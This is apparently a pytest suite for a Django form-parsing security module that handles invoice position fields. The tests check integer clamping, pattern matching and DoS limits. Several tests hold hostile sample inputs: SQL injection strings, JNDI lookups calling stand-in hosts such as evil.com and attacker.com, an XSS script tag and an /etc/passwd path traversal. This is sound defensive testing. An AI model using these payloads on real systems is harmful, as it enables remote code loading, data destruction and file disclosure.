"""
Comprehensive tests for the SecureNestedFormParser security module.

This test suite covers:
1. Security validation against DoS attacks
2. Pattern parsing accuracy
3. Integration with Django forms
4. Edge cases and error handling
5. Performance characteristics
"""

import pytest
from unittest.mock import Mock, patch
from django.core.exceptions import ValidationError
from django.test import RequestFactory

from coda.security.forms import (
    SecureFieldParser,
    PatternMatcher,
    SecureNestedFormParser,
    get_form_count_secure,
    parse_invoice_positions_secure,
    parse_nested_positions_secure,
)
from coda.security.integration import (
    SecureFormIntegration,
    DTOCompatibilityLayer,
)


class TestSecureFieldParser:
    """Test the SecureFieldParser component."""

    def test_valid_integer_parsing(self):
        """Test parsing valid integers."""
        parser = SecureFieldParser()

        assert parser.parse_int_secure("5", max_value=10) == 5
        assert parser.parse_int_secure("0", max_value=10) == 0
        assert parser.parse_int_secure("10", max_value=10) == 10

    def test_integer_security_limits(self):
        """Test DoS protection through max_value limits."""
        parser = SecureFieldParser()

        # Should clamp to max_value
        assert parser.parse_int_secure("999999", max_value=100) == 100
        assert parser.parse_int_secure("1000", max_value=50) == 50

    def test_invalid_integer_handling(self):
        """Test handling of invalid integer inputs."""
        parser = SecureFieldParser()

        # Non-numeric strings should return default
        assert parser.parse_int_secure("abc", default=5) == 5
        assert parser.parse_int_secure("", default=0) == 0
        assert parser.parse_int_secure(None, default=1) == 1

        # Floating point strings should be handled
        assert parser.parse_int_secure("5.7", default=0) == 0

    def test_malicious_input_protection(self):
        """Test protection against malicious inputs."""
        parser = SecureFieldParser()

        # Very large numbers
        assert parser.parse_int_secure("999999999999999999", max_value=100) == 100

        # Negative numbers when min_value is 0
        assert parser.parse_int_secure("-1", min_value=0, default=0) == 0

        # Injection attempts
        assert parser.parse_int_secure("5; DROP TABLE users;", default=0) == 0
        assert parser.parse_int_secure("${jndi:ldap://evil.com}", default=0) == 0


class TestPatternMatcher:
    """Test the PatternMatcher component."""

    def test_simple_pattern_matching(self):
        """Test basic pattern matching functionality."""
        matcher = PatternMatcher("position-{i}-")

        # Should match valid patterns
        assert matcher.matches("position-1-name") is True
        assert matcher.matches("position-5-amount") is True
        assert matcher.matches("position-10-type") is True

        # Should not match invalid patterns
        assert matcher.matches("invoice-1-name") is False
        assert matcher.matches("position-name") is False
        assert matcher.matches("position-a-name") is False

    def test_pattern_index_extraction(self):
        """Test extraction of indices from matched patterns."""
        matcher = PatternMatcher("position-{i}-")

        result = matcher.extract_indices("position-3-amount")
        assert result == {"i": 3}

        result = matcher.extract_indices("position-15-type")
        assert result == {"i": 15}

    def test_nested_pattern_matching(self):
        """Test nested pattern matching with multiple indices."""
        matcher = PatternMatcher("position-{i}-nested-{j}-")

        # Should match nested patterns
        assert matcher.matches("position-1-nested-2-field") is True
        assert matcher.matches("position-5-nested-10-amount") is True

        # Should extract both indices
        result = matcher.extract_indices("position-3-nested-7-field")
        assert result == {"i": 3, "j": 7}

    def test_complex_nested_patterns(self):
        """Test complex multi-level nested patterns."""
        matcher = PatternMatcher("invoice-{i}-positions-{j}-items-{k}-")

        field_name = "invoice-1-positions-2-items-3-description"
        assert matcher.matches(field_name) is True

        result = matcher.extract_indices(field_name)
        assert result == {"i": 1, "j": 2, "k": 3}

    def test_pattern_security_limits(self):
        """Test that pattern matching respects security limits."""
        matcher = PatternMatcher("position-{i}-", max_index=10)

        # Should reject indices exceeding limits
        assert matcher.matches("position-15-field") is False
        assert matcher.matches("position-999-field") is False

        # Should accept indices within limits
        assert matcher.matches("position-5-field") is True
        assert matcher.matches("position-10-field") is True


class TestSecureNestedFormParser:
    """Test the main SecureNestedFormParser class."""

    def test_flat_structure_parsing(self):
        """Test parsing flat form structures."""
        parser = SecureNestedFormParser()

        form_data = {
            "position-1-name": "Article Processing",
            "position-1-amount": "1500.00",
            "position-2-name": "Color Figures",
            "position-2-amount": "300.00",
            "invalid-field": "should be ignored",
        }

        result = parser.parse_flat_structure(form_data, "position-{i}-")

        expected = {
            1: {"name": "Article Processing", "amount": "1500.00"},
            2: {"name": "Color Figures", "amount": "300.00"},
        }

        assert result == expected

    def test_nested_structure_parsing(self):
        """Test parsing nested form structures."""
        parser = SecureNestedFormParser()

        form_data = {
            "position-1-nested-1-item": "APC",
            "position-1-nested-1-cost": "1200.00",
            "position-1-nested-2-item": "Figures",
            "position-1-nested-2-cost": "300.00",
            "position-2-nested-1-item": "Review",
            "position-2-nested-1-cost": "150.00",
        }

        result = parser.parse_nested_structure(form_data, "position-{i}-nested-{j}-")

        expected = {
            1: {
                1: {"item": "APC", "cost": "1200.00"},
                2: {"item": "Figures", "cost": "300.00"},
            },
            2: {
                1: {"item": "Review", "cost": "150.00"},
            },
        }

        assert result == expected

    def test_security_limits_enforcement(self):
        """Test that security limits are enforced during parsing."""
        parser = SecureNestedFormParser(max_items_per_level=3)

        # Create form data that exceeds limits
        form_data = {}
        for i in range(1, 10):  # Try to create 9 positions
            form_data[f"position-{i}-name"] = f"Position {i}"

        result = parser.parse_flat_structure(form_data, "position-{i}-")

        # Should only parse up to max_items_per_level
        assert len(result) <= 3

        # Should contain positions 1, 2, 3 (first ones encountered)
        assert 1 in result
        assert 2 in result
        assert 3 in result

    def test_malicious_input_handling(self):
        """Test handling of malicious form inputs."""
        parser = SecureNestedFormParser()

        malicious_data = {
            "position-999999-name": "DoS attempt",
            "position-${jndi:ldap://evil.com}-field": "Injection attempt",
            "position-1-name": "Valid data",
            "position-<script>alert('xss')</script>-field": "XSS attempt",
        }

        result = parser.parse_flat_structure(malicious_data, "position-{i}-")

        # Should only parse valid, safe data
        assert len(result) == 1
        assert 1 in result
        assert result[1]["name"] == "Valid data"


class TestConvenienceFunctions:
    """Test the convenience functions for common use cases."""

    def test_get_form_count_secure(self):
        """Test secure form count extraction."""
        form_data = {"total-forms": "5", "positions": "3"}

        # Valid counts should be returned
        assert get_form_count_secure(form_data, "total-forms") == 5
        assert get_form_count_secure(form_data, "positions") == 3

        # Invalid/missing counts should return default
        assert get_form_count_secure(form_data, "missing", default=10) == 10
        assert get_form_count_secure({"invalid": "abc"}, "invalid", default=1) == 1

    def test_get_form_count_security_limits(self):
        """Test that form count extraction respects security limits."""
        form_data = {"count": "999999"}

        # Should enforce max_count limit
        result = get_form_count_secure(form_data, "count", max_count=100)
        assert result == 100

    def test_parse_invoice_positions_secure(self):
        """Test secure invoice position parsing."""
        form_data = {
            "number-of-positions": "2",
            "position-1-type": "publication",
            "position-1-amount": "1500.00",
            "position-2-type": "free",
            "position-2-amount": "250.00",
        }

        result = parse_invoice_positions_secure(form_data)

        assert len(result) == 2
        assert 1 in result
        assert 2 in result
        assert result[1]["type"] == "publication"
        assert result[2]["type"] == "free"

    def test_parse_nested_positions_secure(self):
        """Test secure nested position parsing."""
        form_data = {
            "position-1-nested-1-item": "APC",
            "position-1-nested-2-item": "Figures",
            "position-2-nested-1-item": "Review",
        }

        result = parse_nested_positions_secure(form_data)

        assert 1 in result
        assert 2 in result
        assert 1 in result[1]
        assert 2 in result[1]
        assert 1 in result[2]


class TestSecureFormIntegration:
    """Test the integration helpers."""

    def test_secure_position_count(self):
        """Test secure position count extraction from request."""
        request = Mock()
        request.POST = {"number-of-positions": "5"}

        result = SecureFormIntegration.secure_position_count(request)
        assert result == 5

    def test_secure_position_count_with_limits(self):
        """Test position count with security limits."""
        request = Mock()
        request.POST = {"number-of-positions": "999"}

        result = SecureFormIntegration.secure_position_count(request, max_positions=10)
        assert result == 10

    def test_secure_position_count_invalid_input(self):
        """Test position count with invalid input."""
        request = Mock()
        request.POST = {"number-of-positions": "invalid"}

        result = SecureFormIntegration.secure_position_count(request)
        assert result == 0

    def test_secure_total_forms(self):
        """Test secure total forms extraction."""
        data = {"form-total_forms": "3"}

        result = SecureFormIntegration.secure_total_forms(data, "form-")
        assert result == 3

    def test_secure_form_index(self):
        """Test secure form index extraction."""
        result = SecureFormIntegration.secure_form_index("5")
        assert result == 5

        result = SecureFormIntegration.secure_form_index("invalid")
        assert result == 0

    def test_secure_wizard_step(self):
        """Test secure wizard step extraction."""
        store_data = {"step": "3"}

        result = SecureFormIntegration.secure_wizard_step(store_data)
        assert result == 3


class TestDTOCompatibilityLayer:
    """Test the DTO compatibility layer."""

    @patch("coda.security.integration.SecureFormIntegration.secure_position_count")
    def test_create_position_dtos_secure(self, mock_count):
        """Test secure DTO creation from request."""
        mock_count.return_value = 2

        request = Mock()
        request.POST = {
            "position-1-type": "publication",
            "position-2-type": "free",
        }

        # Mock DTO classes
        mock_pub_dto = Mock()
        mock_free_dto = Mock()

        dto_classes = {
            "publication": Mock(return_value=mock_pub_dto),
            "free": Mock(return_value=mock_free_dto),
        }

        # Mock the from_request method
        for dto_class in dto_classes.values():
            dto_class.from_request = Mock(return_value=dto_class())

        result = DTOCompatibilityLayer.create_position_dtos_secure(request, dto_classes)

        # Should have attempted to create DTOs
        assert len(result) >= 0  # Some might fail due to mocking


class TestSecurityScenarios:
    """Test various security attack scenarios."""

    def test_dos_attack_prevention(self):
        """Test prevention of DoS attacks through large form data."""
        parser = SecureNestedFormParser(max_items_per_level=10)

        # Create massive form data
        massive_data = {}
        for i in range(1, 10000):  # Try to create 10k positions
            massive_data[f"position-{i}-field"] = f"value{i}"

        # Should handle gracefully and limit results
        result = parser.parse_flat_structure(massive_data, "position-{i}-")
        assert len(result) <= 10

    def test_memory_exhaustion_prevention(self):
        """Test prevention of memory exhaustion attacks."""
        parser = SecureNestedFormParser()

        # Create data with very long field names/values
        attack_data = {
            "position-1-" + "x" * 10000: "y" * 10000,
            "position-2-normal": "normal_value",
        }

        # Should handle without crashing
        result = parser.parse_flat_structure(attack_data, "position-{i}-")

        # Should still parse normal data
        assert 2 in result
        assert result[2]["normal"] == "normal_value"

    def test_injection_attack_prevention(self):
        """Test prevention of various injection attacks."""
        parser = SecureNestedFormParser()

        injection_data = {
            "position-1-field": "'; DROP TABLE users; --",
            "position-2-field": "${jndi:ldap://attacker.com}",
            "position-3-field": "<script>alert('xss')</script>",
            "position-4-field": "../../etc/passwd",
        }

        result = parser.parse_flat_structure(injection_data, "position-{i}-")

        # Data should be parsed but values remain as-is (not executed)
        # The security is in not executing int() on untrusted data
        assert len(result) == 4
        for i in range(1, 5):
            assert i in result
            assert "field" in result[i]


class TestPerformanceCharacteristics:
    """Test performance aspects of the parser."""

    def test_large_dataset_performance(self):
        """Test parser performance with large datasets."""
        import time

        parser = SecureNestedFormParser(max_items_per_level=1000)

        # Create reasonably large dataset
        large_data = {}
        for i in range(1, 501):  # 500 positions
            large_data[f"position-{i}-name"] = f"Position {i}"
            large_data[f"position-{i}-amount"] = f"{i * 10}.00"

        start_time = time.time()
        result = parser.parse_flat_structure(large_data, "position-{i}-")
        end_time = time.time()

        # Should complete reasonably quickly (< 1 second)
        assert (end_time - start_time) < 1.0
        assert len(result) == 500

    def test_regex_pattern_efficiency(self):
        """Test that regex patterns are efficient."""
        import time

        matcher = PatternMatcher("position-{i}-nested-{j}-items-{k}-")

        test_strings = [
            "position-1-nested-2-items-3-field",
            "invalid-pattern-123",
            "position-abc-nested-def-items-ghi-field",
        ] * 1000  # Test with 3000 strings

        start_time = time.time()
        for test_string in test_strings:
            matcher.matches(test_string)
        end_time = time.time()

        # Should complete quickly even with many pattern matches
        assert (end_time - start_time) < 0.5


@pytest.mark.integration
class TestRealWorldIntegration:
    """Integration tests with real Django components."""

    def test_django_form_field_integration(self):
        """Test integration with actual Django form fields."""
        from django.forms.fields import IntegerField

        parser = SecureFieldParser()
        field = IntegerField(min_value=0, max_value=100)

        # Test that our parser behaves like Django fields
        assert parser.parse_int_secure("50", max_value=100) == field.clean("50")

        # Test that both handle invalid input similarly
        try:
            field.clean("invalid")
            django_result = None
        except ValidationError:
            django_result = "error"

        parser_result = parser.parse_int_secure("invalid", default=0)

        # Both should handle invalid input (parser returns default, Django raises)
        assert parser_result == 0
        assert django_result == "error"

    def test_request_factory_integration(self):
        """Test with Django's RequestFactory."""
        factory = RequestFactory()

        request = factory.post(
            "/test/",
            {
                "number-of-positions": "3",
                "position-1-type": "publication",
                "position-2-type": "free",
            },
        )

        count = SecureFormIntegration.secure_position_count(request)
        assert count == 3


class TestHierarchicalFormParsing:
    """Test hierarchical form parsing functionality."""

    def test_basic_hierarchical_structure(self):
        """Test basic hierarchical parsing with nested arrays."""
        parser = SecureNestedFormParser()

        data = {
            "position-1-name": "APC",
            "position-1-amount": "1200.00",
            "position-1-nested-1-item": "Fee",
            "position-1-nested-1-cost": "800.00",
            "position-1-nested-2-item": "Review",
            "position-1-nested-2-cost": "400.00",
            "position-2-name": "BPC",
            "position-2-nested-1-item": "Processing",
        }

        result = parser.parse_hierarchical_structure(data, "position-{i}-")

        assert len(result) == 2
        assert result[0]["name"] == "APC"
        assert result[0]["amount"] == "1200.00"
        assert len(result[0]["nested"]) == 2
        assert result[0]["nested"][0]["item"] == "Fee"
        assert result[0]["nested"][0]["cost"] == "800.00"
        assert result[0]["nested"][1]["item"] == "Review"
        assert result[0]["nested"][1]["cost"] == "400.00"

        assert result[1]["name"] == "BPC"
        assert len(result[1]["nested"]) == 1
        assert result[1]["nested"][0]["item"] == "Processing"

    def test_multiple_nested_categories(self):
        """Test hierarchical parsing with multiple nested categories."""
        parser = SecureNestedFormParser()

        data = {
            "item-1-name": "Software License",
            "item-1-category-1-type": "Commercial",
            "item-1-category-1-duration": "1 year",
            "item-1-support-1-level": "Premium",
            "item-1-support-1-hours": "24/7",
            "item-1-support-2-level": "Basic",
            "item-1-support-2-hours": "Business hours",
        }

        result = parser.parse_hierarchical_structure(data, "item-{i}-")

        assert len(result) == 1
        assert result[0]["name"] == "Software License"
        assert "category" in result[0]
        assert "support" in result[0]
        assert len(result[0]["category"]) == 1
        assert len(result[0]["support"]) == 2
        assert result[0]["category"][0]["type"] == "Commercial"
        assert result[0]["support"][0]["level"] == "Premium"
        assert result[0]["support"][1]["level"] == "Basic"

    def test_hierarchical_security_limits(self):
        """Test that security limits are enforced in hierarchical parsing."""
        parser = SecureNestedFormParser(max_items_per_level=3)

        data = {}

        # Add positions within limits
        for i in range(1, 4):  # 3 positions - within limit
            data[f"order-{i}-title"] = f"Order {i}"

            # Add nested items within limits
            for j in range(1, 4):  # 3 items - at limit
                data[f"order-{i}-items-{j}-name"] = f"Item {j}"

        # Add positions that should be filtered out
        for i in range(4, 7):  # Should be filtered out
            data[f"order-{i}-title"] = f"Order {i} - Should be filtered"

        # Add nested items that should be filtered out
        for j in range(4, 7):  # Should be filtered out
            data[f"order-1-items-{j}-name"] = f"Item {j} - Should be filtered"

        result = parser.parse_hierarchical_structure(data, "order-{i}-")

        # Should only have 3 orders (within limit)
        assert len(result) == 3

        # Each order should only have 3 items (at limit)
        for order in result:
            assert len(order["items"]) <= 3

        # Ensure filtered items are not present
        item_names = [item["name"] for item in result[0]["items"]]
        assert all("Should be filtered" not in name for name in item_names)

    def test_hierarchical_malformed_data_handling(self):
        """Test hierarchical parsing handles malformed data gracefully."""
        parser = SecureNestedFormParser()

        data = {
            "position-1-name": "Valid Position",
            "position-1-": "",  # Empty field name
            "position--name": "bad",  # Missing index
            "position-abc-name": "non-numeric",  # Non-numeric index
            "invalid-key": "should be ignored",  # Invalid pattern
        }

        result = parser.parse_hierarchical_structure(data, "position-{i}-")

        # Should only parse valid entries
        assert len(result) == 1
        assert result[0]["name"] == "Valid Position"

    def test_hierarchical_empty_result(self):
        """Test hierarchical parsing with no matching data."""
        parser = SecureNestedFormParser()

        data = {"invalid-1-name": "Not matching pattern", "other-data": "irrelevant"}

        result = parser.parse_hierarchical_structure(data, "position-{i}-")
        assert result == []

    def test_hierarchical_large_indices_filtered(self):
        """Test that hierarchical parsing filters out excessively large indices."""
        parser = SecureNestedFormParser()

        data = {
            "position-1-name": "Valid",
            "position-999999-name": "Too high index",
            "position-1-nested-999999-item": "Too high nested index",
        }

        result = parser.parse_hierarchical_structure(data, "position-{i}-")

        # Should only have the valid position
        assert len(result) == 1
        assert result[0]["name"] == "Valid"
        # Should not have any nested items with excessive indices
        assert "nested" not in result[0]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
